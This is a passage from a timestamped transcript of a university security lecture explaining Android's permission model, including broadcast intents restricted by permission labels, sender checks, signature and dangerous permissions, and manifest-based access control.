              <text_slice>you just sent this message.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:14</time_slice>
              <text_slice>And other applications could
either subscribe or not</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:17</time_slice>
              <text_slice>subscribe to these messages.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:19</time_slice>
              <text_slice>So if you have a FRIEND
VIEWER application that it'll</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:22</time_slice>
              <text_slice>subscribe to these messages
by setting the right action</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:25</time_slice>
              <text_slice>or date or data time or MIME
type in their Intent filter,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:30</time_slice>
              <text_slice>but most applications
could always</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:32</time_slice>
              <text_slice>subscribe to all broadcast
events in the system.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:34</time_slice>
              <text_slice>And you are able
to watch everything</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:36</time_slice>
              <text_slice>that's going on on the
phone, or everything</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:38</time_slice>
              <text_slice>that's being broadcast.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:40</time_slice>
              <text_slice>So the Android framework added
an extra sort of argument</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:44</time_slice>
              <text_slice>for applications to
be able to specify</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:46</time_slice>
              <text_slice>who should be able to
see a broadcast message.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:49</time_slice>
              <text_slice>So when you're sending
a broadcast message,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:55</time_slice>
              <text_slice>there's the obvious
argument, which</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:58</time_slice>
              <text_slice>is the message you want to send,
which is basically an intent.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:01</time_slice>
              <text_slice>But then you can also
specify an optional label</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:04</time_slice>
              <text_slice>that describes who should be
able to receive this message.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:09</time_slice>
              <text_slice>So instead of broadcasting
to everyone in the system,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:11</time_slice>
              <text_slice>you can say, well, only
other applications that</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:13</time_slice>
              <text_slice>have a certain permission
should be able to receive</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:16</time_slice>
              <text_slice>this broadcast message from me.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:20</time_slice>
              <text_slice>So this way, you could send
out sensitive information,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:23</time_slice>
              <text_slice>like the locations
of your friends,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:25</time_slice>
              <text_slice>in the paper's
example, and make sure</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:28</time_slice>
              <text_slice>that only those
applications that</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:31</time_slice>
              <text_slice>are allowed to see the
list of your friends</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:33</time_slice>
              <text_slice>will actually get your
broadcast message.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:35</time_slice>
              <text_slice>So this is how, on
Android, you can actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:37</time_slice>
              <text_slice>control who receives the
message that you're sending out,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:42</time_slice>
              <text_slice>at least in the broadcast case.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:44</time_slice>
              <text_slice>Question?</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:45</time_slice>
              <text_slice>No. [? Sorry. ?]</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:47</time_slice>
              <text_slice>How do you authenticate
where a message is actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:49</time_slice>
              <text_slice>coming from?</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:50</time_slice>
              <text_slice>So suppose that in
Android, you register</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:55</time_slice>
              <text_slice>for-- in the paper's example,
you have your FRIEND VIEWER</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:58</time_slice>
              <text_slice>and you receive
a message saying,</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:00</time_slice>
              <text_slice>yep, this friend is nearby.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:02</time_slice>
              <text_slice>How do you know this actually
came from the right component?</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:07</time_slice>
              <text_slice>Can you actually convince
yourself of this?</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:09</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:10</time_slice>
              <text_slice>AUDIENCE: Using
the kernel codes?</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:13</time_slice>
              <text_slice>Wouldn't you trust the
kernel [INAUDIBLE]?</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:14</time_slice>
              <text_slice>PROFESSOR: Potentially, yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:19</time_slice>
              <text_slice>Well, this binder thing is going
to tell the reference monitor,</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:21</time_slice>
              <text_slice>here's where the
intent came from.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:23</time_slice>
              <text_slice>And then the
reference monitor is</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:24</time_slice>
              <text_slice>going to forward this intent
to your receiver application.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:27</time_slice>
              <text_slice>And somewhere in
there is the name</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:28</time_slice>
              <text_slice>of the applet that
sent this guy.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:30</time_slice>
              <text_slice>How should you
check whether this</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:32</time_slice>
              <text_slice>is a reasonable app that should
be sending these intents?</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:38</time_slice>
              <text_slice>Is there a way to
do this in Android?</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:41</time_slice>
              <text_slice>I guess you're right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:42</time_slice>
              <text_slice>Strictly speaking, yeah, the
source is always authenticated.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:44</time_slice>
              <text_slice>You know exactly which
app sent the message.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:47</time_slice>
              <text_slice>But what do you do
with a source name?</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:49</time_slice>
              <text_slice>How do you check whether
it should be sending</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:51</time_slice>
              <text_slice>these Friend is Near messages?</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:53</time_slice>
              <text_slice>[INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:54</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:54</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE]
label [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:58</time_slice>
              <text_slice>PROFESSOR: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:58</time_slice>
              <text_slice>So one way to do it
is to actually stick</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:02</time_slice>
              <text_slice>a label on the
broadcast receiver.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:04</time_slice>
              <text_slice>So one thing you could is say,
well, the only people that</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:07</time_slice>
              <text_slice>are allowed to send a message
to the broadcast receiver</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:10</time_slice>
              <text_slice>are people with the Friend
Tracker maybe label.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:20</time_slice>
              <text_slice>So if you stick such a label
on your broadcast receiver,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:23</time_slice>
              <text_slice>then you know that only
messages sent from applications</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:27</time_slice>
              <text_slice>with this label are going to get
to you through your broadcast</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:30</time_slice>
              <text_slice>receiver.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:31</time_slice>
              <text_slice>That's one way to filter who's
able to send messages to you is</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:35</time_slice>
              <text_slice>by restricting them by label.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:38</time_slice>
              <text_slice>So this works in many cases.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:41</time_slice>
              <text_slice>Android also provides a
more specific function</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:46</time_slice>
              <text_slice>that you can use.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:47</time_slice>
              <text_slice>It's called Check Privilege.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:55</time_slice>
              <text_slice>And you could sort of say--
or Check Sender Privilege,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:58</time_slice>
              <text_slice>I think.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:59</time_slice>
              <text_slice>And you could ask the
framework whether the sender</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:04</time_slice>
              <text_slice>of the intent you're looking
at has a certain label</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:07</time_slice>
              <text_slice>in its provisions.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:08</time_slice>
              <text_slice>So this way, you can also
reason about what privileges</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:12</time_slice>
              <text_slice>does the sender of
a particular message</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:15</time_slice>
              <text_slice>have in situations where maybe
the framework doesn't provide</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:18</time_slice>
              <text_slice>quite the right mechanisms
in the manifest to do this.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:23</time_slice>
              <text_slice>One place where this Check
Sender Privilege function</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:27</time_slice>
              <text_slice>turns out to be
particularly useful</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:28</time_slice>
              <text_slice>is in the case of this RPC
interaction between two</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:31</time_slice>
              <text_slice>applications, where the
reference monitor isn't</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:33</time_slice>
              <text_slice>actually involved in mediating
the RPC-looking applications.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:37</time_slice>
              <text_slice>But you still want to
ask, is the application</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:40</time_slice>
              <text_slice>of [INAUDIBLE] privileged
for this kind of operation?</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:43</time_slice>
              <text_slice>So this way, you can
manually invoke-- or check</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:48</time_slice>
              <text_slice>what's in the manifest
of an application.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:51</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:51</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:56</time_slice>
              <text_slice>PROFESSOR: Well, so I
guess-- [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:00</time_slice>
              <text_slice>AUDIENCE: You can use the
signature to enable it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:02</time_slice>
              <text_slice>PROFESSOR: Yeah, so
one thing that stops</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:03</time_slice>
              <text_slice>is presumably the [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:05</time_slice>
              <text_slice>If the label is a
signature type label,</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:07</time_slice>
              <text_slice>then that's going to stop
it if it's not [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:09</time_slice>
              <text_slice>AUDIENCE: That requires
the same signature as--</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:11</time_slice>
              <text_slice>PROFESSOR: That's right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:12</time_slice>
              <text_slice>Yeah, yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:12</time_slice>
              <text_slice>So that requires it be
the same, exact developer.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:14</time_slice>
              <text_slice>Another thing that stops it is
that maybe the permission is</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:18</time_slice>
              <text_slice>labelled as Dangerous.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:19</time_slice>
              <text_slice>So then the user is going
to see this on their screen.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:21</time_slice>
              <text_slice>When you install an
app, it says, this app</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:23</time_slice>
              <text_slice>requires the permission
of viewing your friends,</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:26</time_slice>
              <text_slice>or your friends' locations.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:27</time_slice>
              <text_slice>AUDIENCE: But that's taken
from the description.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:29</time_slice>
              <text_slice>PROFESSOR: That's right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:29</time_slice>
              <text_slice>AUDIENCE: So what's
[INAUDIBLE] from just giving</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:31</time_slice>
              <text_slice>a different description?</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:33</time_slice>
              <text_slice>PROFESSOR: So I should
say, this description</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:38</time_slice>
              <text_slice>comes from the application that
initially defines this label.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:41</time_slice>
              <text_slice>So the label is initially--
so there's two things going on</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:46</time_slice>
              <text_slice>in the manifest.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:47</time_slice>
              <text_slice>You can ask for access
to existing labels.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:51</time_slice>
              <text_slice>So I can say, well,
this is an application.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:53</time_slice>
              <text_slice>I want access to the
FRIEND VIEW permission.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:56</time_slice>
              <text_slice>And a separate thing you can
do in the manifest is say,</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:58</time_slice>
              <text_slice>I am defining a
new kind of label.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:01</time_slice>
              <text_slice>So then the first Friend
Viewer application--</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:04</time_slice>
              <text_slice>or the Friend Tracker
application, presumably,</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:06</time_slice>
              <text_slice>is going to say, well,
I have an application,</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:08</time_slice>
              <text_slice>it has these permission.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:09</time_slice>
              <text_slice>But also, I'm defining
a new kind of label.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:11</time_slice>
              <text_slice>It's called this.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:13</time_slice>
              <text_slice>It's type Dangerous, and
it has this description.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:16</time_slice>
              <text_slice>So that's a place where
you have to really get</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:19</time_slice>
              <text_slice>the-- this is that first
come, first served problem.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:22</time_slice>
              <text_slice>But as long as the application
that should define the label</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:25</time_slice>
              <text_slice>is installed first, then
you're in good shape.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:27</time_slice>
              <text_slice>Any subsequent application
is going to ask for the label</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:30</time_slice>
              <text_slice>just by its string name.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:32</time_slice>
              <text_slice>And then the Android
framework will fish out</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:34</time_slice>
              <text_slice>the description and the
type from the application</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:37</time_slice>
              <text_slice>that first defined it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:42</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:43</time_slice>
              <text_slice>Any other questions here?</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:47</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:48</time_slice>
              <text_slice>So I guess this gives you some
sense of how Android works.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:52</time_slice>
              <text_slice>So one cool thing about it
is that you can actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:56</time_slice>
              <text_slice>get this manifest that,
to a larger extent,</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:58</time_slice>
              <text_slice>describes the security
properties of an application.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:01</time_slice>
              <text_slice>So this is one thing that
the developers of the Android</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:04</time_slice>
              <text_slice>framework were going
for-- something called</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:06</time_slice>
              <text_slice>mandatory access control,
where you can actually specify</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:09</time_slice>
              <text_slice>the security policy of
an application separate</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:12</time_slice>
              <text_slice>from the application
itself, and in fact,</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:14</time_slice>
              <text_slice>have that security policy be
enforced by this reference</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:17</time_slice>
              <text_slice>monitor regardless of what that
application itself is doing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:21</time_slice>
              <text_slice>So it seems like kind
of a nice property</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:23</time_slice>
              <text_slice>to be able to audit an
application by looking</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:25</time_slice>
              <text_slice>at this manifest file.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:27</time_slice>
              <text_slice>You can mostly think of it as a
development nicety rather than</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:31</time_slice>
              <text_slice>a strict enforcement mechanism,
because if an application</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:33</time_slice>
              <text_slice>really wants to get
around its own manifest,</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:35</time_slice>
              <text_slice>it can probably do so.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:37</time_slice>
              <text_slice>But it seems like
a nice way of being</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:39</time_slice>
              <text_slice>able to understand what's going
on with an application in terms</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:42</time_slice>
              <text_slice>of security without having to
dive down into the Java code.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:45</time_slice>
              <text_slice>Of course, it matters,
but you can still</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:47</time_slice>
              <text_slice>get a high-level sense of what's
going on in an application</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:50</time_slice>
              <text_slice>from the manifest.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:52</time_slice>
              <text_slice>One bummer, I guess, as we
were talking about here,</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:55</time_slice>
              <text_slice>there are some situations where
the Android framework turns out</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:58</time_slice>
              <text_slice>to be not quite expressive
enough in the manifest.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:01</time_slice>
              <text_slice>And you have to
still write code that</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:03</time_slice>
              <text_slice>talks about security checks.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:05</time_slice>
              <text_slice>It would be, in some ways,
nice if there were no security</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:07</time_slice>
              <text_slice>checks at all in the code
and all the security checks</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:10</time_slice>
              <text_slice>went to the manifest.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:11</time_slice>
              <text_slice>But that would mean exposing
things like all the RPCs</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:14</time_slice>
              <text_slice>to the framework and so on.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:16</time_slice>
              <text_slice>That's potentially
a bit of a trade-off</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:18</time_slice>
              <text_slice>that these guys are making.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:19</time_slice>
              <text_slice>And I guess one other
thing is it's actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:21</time_slice>
              <text_slice>kind of hard to change
the manifest file</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:23</time_slice>
              <text_slice>after you design the system.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:25</time_slice>
              <text_slice>So one perhaps
surprising thing is</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:28</time_slice>
              <text_slice>that the Android
framework hasn't changed</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:29</time_slice>
              <text_slice>in terms of security very
much since it was released</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:32</time_slice>
              <text_slice>or since this paper was
written five years ago, or six</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:34</time_slice>
              <text_slice>years ago now.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:36</time_slice>
              <text_slice>Because once the application
starts using this framework,</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:38</time_slice>
              <text_slice>it's hard to say some existing
application's going to break.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:41</time_slice>
              <text_slice>So you basically
have to maintain</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:43</time_slice>
              <text_slice>backwards compatibility
to a large extent.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:44</time_slice>
              <text_slice>So you don't get a chance
to sort of do it over again.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:49</time_slice>
              <text_slice>I guess one
interesting thing that</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:50</time_slice>
              <text_slice>did happen to Android
since this paper came out</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:53</time_slice>
              <text_slice>is that the Android guys
borrowed an idea from Apple</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:59</time_slice>
              <text_slice>and are doing now much
more server-side analysis</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:01</time_slice>
              <text_slice>of applications.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:02</time_slice>
              <text_slice>So Apple, on the iPhone side,
is pretty aggressive in terms</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:06</time_slice>
              <text_slice>of having the Apple server
checking all the applications</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:11</time_slice>
              <text_slice>from developers for
various guidelines,</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:13</time_slice>
              <text_slice>including security properties.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:15</time_slice>
              <text_slice>And the Android servers, or
this Android market or whatever,</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:19</time_slice>
              <text_slice>now also does quite a bit
of analysis of applications</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:21</time_slice>
              <text_slice>submitted by developers
to make sure they are not</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:24</time_slice>
              <text_slice>malicious in some loose sense.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:27</time_slice>
              <text_slice>So that's kind of a cool thing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:28</time_slice>
              <text_slice>And it is largely
[? orthogonal ?]</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:30</time_slice>
              <text_slice>to this security architecture.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:32</time_slice>
              <text_slice>So this security architecture
works on your phone.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:33</time_slice>
              <text_slice>But then for any other
security problems,</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:35</time_slice>
              <text_slice>the server can evolve
defenses over time as need be.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:39</time_slice>
              <text_slice>And those tend to be more
on the phishing side, where</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:42</time_slice>
              <text_slice>the human is being tricked
into doing something</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:44</time_slice>
              <text_slice>rather than on exploiting
some specific vulnerability</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:46</time_slice>
              <text_slice>in the kernel,
perhaps, and so on.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:49</time_slice>
              <text_slice>Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:51</time_slice>
              <text_slice>Any other questions?</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:52</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:53</time_slice>
              <text_slice>So we'll see you guys
on Wednesday, hopefully.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:55</time_slice>
              <text_slice>We'll talk about an extension
of Android for data privacy.</text_slice>
            </slice>
          </transcript>
        </video>
      </videos>
    </lecture>
  </lectures>
</doc>
